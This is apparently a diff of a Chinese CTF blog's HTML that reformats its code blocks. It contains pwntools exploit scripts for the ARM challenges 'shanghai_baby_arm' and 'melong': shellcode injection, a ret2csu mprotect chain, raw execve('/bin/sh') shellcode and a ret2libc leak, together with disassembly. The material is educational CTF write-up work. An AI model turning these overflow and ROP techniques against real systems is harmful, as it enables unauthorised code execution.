-<pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
-
-io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])
-
-shellcode = asm(shellcraft.sh())
-io.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)
-sleep(<span class="number">0.3</span>)
-payload = cyclic(<span class="number">72</span>) + p64(<span class="number">0x411068</span>)  <span class="comment">#PC -> bss_addr <- shellcode</span>
-io.sendline(payload)
-
-io.interactive()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>,<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">payload = cyclic(<span class="number">72</span>) + p64(<span class="number">0x411068</span>)  <span class="comment">#PC -&gt; bss_addr &lt;- shellcode</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>ret2csu</p>
 <p>mprotect(bss, 0x1000, 7)  -&gt; x0 &#x3D; bss_addr   x1&#x3D;0x1000  x2&#x3D;7  x3&#x3D;mprotect_plt</p>
 <p>csu -&gt; x24 &#x3D; bss_addr x23 &#x3D; 0x1000 x22 &#x3D; 7 x21&#x3D;mprotect_plt x19&#x3D;0  x20&#x3D;1</p>
-<pre class=" language-highlight assembly"><code class="language-highlight assembly">.text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j -->csu2
-.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
-.text:00000000004008B0                 MOV             X2, X22
-.text:00000000004008B4                 MOV             X1, X23
-.text:00000000004008B8                 MOV             W0, W24
-.text:00000000004008BC                 ADD             X19, X19, #1
-.text:00000000004008C0                 BLR             X3
-.text:00000000004008C4                 CMP             X19, X20
-.text:00000000004008C8                 B.NE            loc_4008AC
-.text:00000000004008CC
-.text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   -->csu1
-.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]
-.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
-.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
-.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
-.text:00000000004008DC                 RET</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j --&gt;csu2</span><br><span class="line">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0                 MOV             X2, X22</span><br><span class="line">.text:00000000004008B4                 MOV             X1, X23</span><br><span class="line">.text:00000000004008B8                 MOV             W0, W24</span><br><span class="line">.text:00000000004008BC                 ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0                 BLR             X3</span><br><span class="line">.text:00000000004008C4                 CMP             X19, X20</span><br><span class="line">.text:00000000004008C8                 B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   --&gt;csu1</span><br><span class="line">.text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC                 RET</span><br></pre></td></tr></table></figure>
 
 
 
 <p>布置csu1：先布置x29和x30，x30存储函数调用的返回地址，在执行ret后调用，控制x30指向csu2，实现第一次控制流挟持；然后控制对应寄存器在csu2中的赋值</p>
 <p>控制csu2：按照对应寄存器进行赋值，然后x19+1，会与x20比较，如果相等就会继续执行csu1，此时通过布置栈空间可以再次控制x30，执行到ret时能够实现第二次控制流挟持。</p>
-<pre class=" language-highlight python"><span class="keyword">from</span> pwn <span class="keyword"><code class="language-highlight python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
-context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)
-
-<span class="comment"># io = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;9999&#x27;, &#x27;./shanghai_baby_arm&#x27;])</span>
-io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])
-elf = ELF(<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>)
-bss = <span class="number">0x411068</span>
-
-shellcode = asm(shellcraft.aarch64.sh()).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])   <span class="comment">#0x411068</span>
-io.sendafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)
-sleep(<span class="number">0.3</span>)
-
-<span class="comment"># .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j -->csu2</span>
-<span class="comment"># .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span>
-<span class="comment"># .text:00000000004008B0                 MOV             X2, X22</span>
-<span class="comment"># .text:00000000004008B4                 MOV             X1, X23</span>
-<span class="comment"># .text:00000000004008B8                 MOV             W0, W24</span>
-<span class="comment"># .text:00000000004008BC                 ADD             X19, X19, #1</span>
-<span class="comment"># .text:00000000004008C0                 BLR             X3</span>
-<span class="comment"># .text:00000000004008C4                 CMP             X19, X20</span>
-<span class="comment"># .text:00000000004008C8                 B.NE            loc_4008AC</span>
-<span class="comment"># .text:00000000004008CC</span>
-<span class="comment"># .text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   -->csu1</span>
-<span class="comment"># .text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span>
-<span class="comment"># .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span>
-<span class="comment"># .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span>
-<span class="comment"># .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span>
-<span class="comment"># .text:00000000004008DC                 RET</span>
-
-csu1 = <span class="number">0x00000000004008CC</span>
-csu2 = <span class="number">0x00000000004008AC</span>
-<span class="comment">#mprotect(bss_addr, 0x1000, 7)   --> x19=0, x20=1, x21=mprotect_addr, x22=7, x23=0x1000, x24=bss_addr, x29=0xdeadbeef, x30=csu2</span>
-
-payload  = cyclic(<span class="number">72</span>) + p64(csu1)
-payload += p64(<span class="number">0xdeadbeef</span>) + p64(csu2)  <span class="comment">#x29  x30</span>
-payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#x19 x20</span>
-payload += p64(bss+<span class="number">0x100</span>) + p64(<span class="number">7</span>) <span class="comment">#x21  x22</span>
-payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0x411000</span>) <span class="comment">#x23  x24 </span>
-
-payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x29  x30->shellcode</span>
-payload += p64(<span class="number">0</span>)*<span class="number">6</span> 
-
-<span class="comment"># pause()</span>
-io.sendline(payload)
-
-io.interactive()</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;qemu-aarch64&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu/&#x27;,&#x27;-g&#x27;,&#x27;9999&#x27;, &#x27;./shanghai_baby_arm&#x27;])</span></span><br><span class="line">io = process([<span class="string">&#x27;qemu-aarch64&#x27;</span>,<span class="string">&#x27;-L&#x27;</span>,<span class="string">&#x27;/usr/aarch64-linux-gnu/&#x27;</span>, <span class="string">&#x27;./shanghai_baby_arm&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shanghai_baby_arm&#x27;</span>)</span><br><span class="line">bss = <span class="number">0x411068</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.aarch64.sh()).ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(elf.plt[<span class="string">&#x27;mprotect&#x27;</span>])   <span class="comment">#0x411068</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Name:&#x27;</span>, shellcode)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j --&gt;csu2</span></span><br><span class="line"><span class="comment"># .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]</span></span><br><span class="line"><span class="comment"># .text:00000000004008B0                 MOV             X2, X22</span></span><br><span class="line"><span class="comment"># .text:00000000004008B4                 MOV             X1, X23</span></span><br><span class="line"><span class="comment"># .text:00000000004008B8                 MOV             W0, W24</span></span><br><span class="line"><span class="comment"># .text:00000000004008BC                 ADD             X19, X19, #1</span></span><br><span class="line"><span class="comment"># .text:00000000004008C0                 BLR             X3</span></span><br><span class="line"><span class="comment"># .text:00000000004008C4                 CMP             X19, X20</span></span><br><span class="line"><span class="comment"># .text:00000000004008C8                 B.NE            loc_4008AC</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC loc_4008CC                              ; CODE XREF: init+3C↑j   --&gt;csu1</span></span><br><span class="line"><span class="comment"># .text:00000000004008CC                 LDP             X19, X20, [SP,#var_s10]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]</span></span><br><span class="line"><span class="comment"># .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40</span></span><br><span class="line"><span class="comment"># .text:00000000004008DC                 RET</span></span><br><span class="line"></span><br><span class="line">csu1 = <span class="number">0x00000000004008CC</span></span><br><span class="line">csu2 = <span class="number">0x00000000004008AC</span></span><br><span class="line"><span class="comment">#mprotect(bss_addr, 0x1000, 7)   --&gt; x19=0, x20=1, x21=mprotect_addr, x22=7, x23=0x1000, x24=bss_addr, x29=0xdeadbeef, x30=csu2</span></span><br><span class="line"></span><br><span class="line">payload  = cyclic(<span class="number">72</span>) + p64(csu1)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>) + p64(csu2)  <span class="comment">#x29  x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload += p64(bss+<span class="number">0x100</span>) + p64(<span class="number">7</span>) <span class="comment">#x21  x22</span></span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(<span class="number">0x411000</span>) <span class="comment">#x23  x24 </span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(bss) <span class="comment">#x29  x30-&gt;shellcode</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">6</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>当然也可以用第二题的思路，利用read(0, &amp;buf, 0x200)实现任意地址写，然后往bss段里写数据，不过没意义罢了</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122029207.png" alt="image-20240712202911121"></p>
@@ -602,140 +491,15 @@ io.interactive()</code></pre>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407122047946.png" alt="image-20240712204759900"></p>
 <p>在这些之前，需要进入check给v6赋值才能接下来操作</p>
 <p>所以我们先进入case1设置v6&#x3D;!0，然后进入case3输入size&#x3D;-1从而malloc失败，使ptr&#x3D;exc2&#x3D;0，size_t的size被赋值为了0xffffffff，之后进入case4的write_diary，通过  LDRB    R3, [R11,#nbytes] 从R11的-5偏移处加载一字节到R3寄存器中</p>
-<pre class=" language-highlight assembly"><code class="language-highlight assembly">.text:000106D4 write_diary                             ; CODE XREF: main+184↓p
-.text:000106D4
-.text:000106D4 buf             = -0x14
-.text:000106D4 var_10          = -0x10
-.text:000106D4 nbytes          = -5
-.text:000106D4
-.text:000106D4                 PUSH    &#123;R11,LR&#125;
-.text:000106D8                 ADD     R11, SP, #4
-.text:000106DC                 SUB     SP, SP, #0x10
-.text:000106E0                 STR     R0, [R11,#var_10]
-.text:000106E4                 STR     R1, [R11,#buf]
-.text:000106E8                 LDR     R3, [R11,#var_10]
-.text:000106EC                 LDR     R3, [R3]
-.text:000106F0                 STRB    R3, [R11,#nbytes]
-.text:000106F4                 LDRB    R3, [R11,#nbytes]
-.text:000106F8                 CMP     R3, #0
-.text:000106FC                 BEQ     loc_10720
-.text:00010700                 LDRB    R3, [R11,#nbytes]
-.text:00010704                 MOV     R2, R3          ; nbytes
-.text:00010708                 LDR     R1, [R11,#buf]  ; buf
-.text:0001070C                 MOV     R0, #0          ; fd
-.text:00010710                 BL      read
-.text:00010714                 LDR     R1, [R11,#buf]
-.text:00010718                 LDR     R0, =format     ; "you wrote %s\n"
-.text:0001071C                 BL      printf</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:000106D4 write_diary                             ; CODE XREF: main+184↓p</span><br><span class="line">.text:000106D4</span><br><span class="line">.text:000106D4 buf             = -0x14</span><br><span class="line">.text:000106D4 var_10          = -0x10</span><br><span class="line">.text:000106D4 nbytes          = -5</span><br><span class="line">.text:000106D4</span><br><span class="line">.text:000106D4                 PUSH    &#123;R11,LR&#125;</span><br><span class="line">.text:000106D8                 ADD     R11, SP, #4</span><br><span class="line">.text:000106DC                 SUB     SP, SP, #0x10</span><br><span class="line">.text:000106E0                 STR     R0, [R11,#var_10]</span><br><span class="line">.text:000106E4                 STR     R1, [R11,#buf]</span><br><span class="line">.text:000106E8                 LDR     R3, [R11,#var_10]</span><br><span class="line">.text:000106EC                 LDR     R3, [R3]</span><br><span class="line">.text:000106F0                 STRB    R3, [R11,#nbytes]</span><br><span class="line">.text:000106F4                 LDRB    R3, [R11,#nbytes]</span><br><span class="line">.text:000106F8                 CMP     R3, #0</span><br><span class="line">.text:000106FC                 BEQ     loc_10720</span><br><span class="line">.text:00010700                 LDRB    R3, [R11,#nbytes]</span><br><span class="line">.text:00010704                 MOV     R2, R3          ; nbytes</span><br><span class="line">.text:00010708                 LDR     R1, [R11,#buf]  ; buf</span><br><span class="line">.text:0001070C                 MOV     R0, #0          ; fd</span><br><span class="line">.text:00010710                 BL      read</span><br><span class="line">.text:00010714                 LDR     R1, [R11,#buf]</span><br><span class="line">.text:00010718                 LDR     R0, =format     ; &quot;you wrote %s\n&quot;</span><br><span class="line">.text:0001071C                 BL      printf</span><br></pre></td></tr></table></figure>
 
 <p>最终实现read(0, v5, 0xff)，v5为主函数的局部变量，离栈底只有0x54字节长</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131320268.png" alt="image-20240713132058100"></p>
 <p>可以直接用栈地址作为返回地址，将shellcode布置在栈上，打ret2shellcode。</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/env python</span>
-<span class="comment"># coding:utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
-<span class="comment">#from ctypes import *</span>
-
-<span class="keyword">def</span> <span class="title function_">chk</span>():
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))
-    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))
-    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))
-    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
-    context.arch = <span class="string">&#x27;arm&#x27;</span>
-    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>
-    pwnfile = <span class="string">&#x27;./melong&#x27;</span>
-    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
-    elf  = ELF(pwnfile)
-    libc = ELF(libc_name)
-
-    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./  ./melong&#x27;)</span>
-    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;</span>)
-    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *0x01117C&#x27;, pwnfile)</span>
-    dbg(<span class="string">&#x27;b *0x01126C \n b *0x0010710&#x27;</span>)
-
-    chk()
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))
-    shellcode  = <span class="string">b"\x02\x20\x42\xe0\x1c\x30\x8f\xe2"</span>
-    shellcode += <span class="string">b"\x04\x30\x8d\xe5\x08\x20\x8d\xe5"</span>
-    shellcode += <span class="string">b"\x13\x02\xa0\xe1\x07\x20\xc3\xe5"</span>
-    shellcode += <span class="string">b"\x04\x30\x8f\xe2\x04\x10\x8d\xe2"</span>
-    shellcode += <span class="string">b"\x01\x20\xc3\xe5\x0b\x0b\x90\xef"</span>
-    shellcode += <span class="string">b"/bin/sh"</span>
-    payload = shellcode.ljust(<span class="number">84</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(<span class="number">0xfffef0d0</span>)
-    sl(payload)
-
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))
-    itr()
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chk</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./melong&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./  ./melong&#x27;)</span></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach((&#x27;127.0.0.1&#x27;, 12345), &#x27;b *0x01117C&#x27;, pwnfile)</span></span><br><span class="line">    dbg(<span class="string">&#x27;b *0x01126C \n b *0x0010710&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    chk()</span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    shellcode  = <span class="string">b&quot;\x02\x20\x42\xe0\x1c\x30\x8f\xe2&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x04\x30\x8d\xe5\x08\x20\x8d\xe5&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x13\x02\xa0\xe1\x07\x20\xc3\xe5&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x04\x30\x8f\xe2\x04\x10\x8d\xe2&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;\x01\x20\xc3\xe5\x0b\x0b\x90\xef&quot;</span></span><br><span class="line">    shellcode += <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">    payload = shellcode.ljust(<span class="number">84</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(<span class="number">0xfffef0d0</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>ret2libc 构造puts泄露信息，需要利用PC控制puts调用后的下一条指令</p>
-<pre class=" language-highlight python"><span class="comment"><code class="language-highlight python"><span class="comment">#!/usr/bin/env python</span>
-<span class="comment"># coding:utf-8</span>
-<span class="keyword">from</span> pwn <span class="keyword">import</span> *
-<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
-<span class="comment">#from ctypes import *</span>
-
-<span class="keyword">def</span> <span class="title function_">chk</span>():
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))
-    sla(<span class="string">b&#x27;Your height(meters) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1.65</span>))
-    sla(<span class="string">b&#x27;Your weight(kilograms) : &#x27;</span>, <span class="built_in">str</span>(<span class="number">100</span>))
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))
-    sla(<span class="string">b&#x27;How long do you want to take personal training?\n&#x27;</span>, <span class="built_in">str</span>(-<span class="number">1</span>))
-
-<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
-    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
-    context.arch = <span class="string">&#x27;arm&#x27;</span>
-    IPort = <span class="string">&#x27;127.0.0.1 12345&#x27;</span>
-    pwnfile = <span class="string">&#x27;./melong&#x27;</span>
-    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
-    elf  = ELF(pwnfile)
-    libc = ELF(libc_name)
-
-    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-arm -L ./  ./melong&#x27;</span>)
-    <span class="comment"># io = initc(pwnfile, IPort, &#x27;qemu-arm -L ./ -g 12345 ./melong&#x27;)</span>
-    <span class="comment"># dbg(&#x27;b *0x01126C \n b *0x0010710&#x27;)</span>
-
-    puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]
-    main = elf.sym[<span class="string">&#x27;main&#x27;</span>]
-
-<span class="comment"># .text:000110BC                 BL      puts</span>
-<span class="comment"># .text:000110C0                 NOP</span>
-<span class="comment"># .text:000110C4                 POP     &#123;R11,PC&#125;</span>
-<span class="comment"># .text:000110C4 ; End of function check_first</span>
-    puts= <span class="number">0x000110BC</span>
-
-    pr0 = <span class="number">0x00011bbc</span>
-    pr3 = <span class="number">0x00010460</span>
-    pr4 = <span class="number">0x000105e4</span>
-    pr11= <span class="number">0x00011290</span> 
-
-    chk()
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))
-
-    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(puts_got) + p32(puts) + p32(<span class="number">0</span>) + p32(main)
-    sl(payload)
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))
-
-    puts_addr = uu32(r32())
-    libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]
-    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]
-    bin_sh    = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))
-   
-    chk()
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))
-
-    payload = cyclic(<span class="number">84</span>) + p32(pr0) + p32(bin_sh) + p32(system)
-    sl(payload)
-    sla(<span class="string">b&#x27;Type the number:&#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))
-
-    leak(<span class="string">"libc_base"</span>, libc_base)
-    itr()
-</code></pre>
